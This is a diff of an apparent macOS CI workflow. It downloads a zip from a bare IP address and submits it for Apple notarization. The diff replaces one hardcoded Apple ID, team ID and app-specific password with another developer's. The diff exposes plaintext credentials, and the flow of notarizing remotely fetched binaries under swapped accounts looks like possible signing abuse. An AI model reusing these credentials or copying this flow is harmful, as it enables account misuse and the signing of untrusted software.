@@ -17,13 +17,13 @@ jobs:
       run: |
         # Replace this with the actual command to download the file from the IP address.
         # You can use 'curl' or other relevant tools.
-        curl -o ct.zip http://161.35.226.248:9000/ct.zip
+        curl -o qs.zip http://161.35.226.248:9000/qs.zip
         # brew install cliclick
         # cliclick c:.
         # echo $?
         # screencapture "$PWD/screenshot_$(date +%Y%m%d%H%M%S).png"
         ls -alrt "$PWD"
-        xcrun notarytool submit ct.zip --apple-id "catarina@jrsecuritys.com" --team-id "X564X84QG3" --password "oniw-cxyd-xxhw-ydyd" --wait
+        xcrun notarytool submit qs.zip --apple-id "ayub.khan@funappspro.com" --team-id "QLBRTTS84C" --password "eqsw-slaz-dkmp-nzht" --wait
     # You would need to add additional steps here to perform notarization.
     # The specific notarization process depends on your application and requirements.
 
